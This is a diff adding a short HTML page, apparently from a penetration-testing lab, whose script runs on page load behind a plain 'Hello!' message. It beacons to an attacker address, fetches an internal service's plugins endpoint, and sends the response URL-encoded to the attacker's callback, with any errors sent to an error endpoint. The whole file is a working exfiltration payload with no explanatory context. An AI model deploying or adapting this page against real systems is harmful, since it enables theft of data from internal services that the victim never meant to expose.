@@ -1,0 +1,30 @@
+<html>
+<head>
+<script>
+let LHOST = "192.168.45.152";
+
+run = () => {
+	fetch("http://" + LHOST + "/init?msg=JS-injection-running!");
+	exfiltrate();
+}
+
+exfiltrate = () => {
+	fetch("http://172.16.16.2:8001/plugins", {
+		method: "GET"
+	})
+	.then((response) => response.text())
+	.then((data) => {
+		fetch("http://" + LHOST + "/callback?data=" +  encodeURIComponent(data));
+	}).catch((err) => {
+		fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+	})
+}
+
+</script>
+<body onload='run()'>
+<p> Hello! </p>
+</body>
+</head>
+
+
+</html>
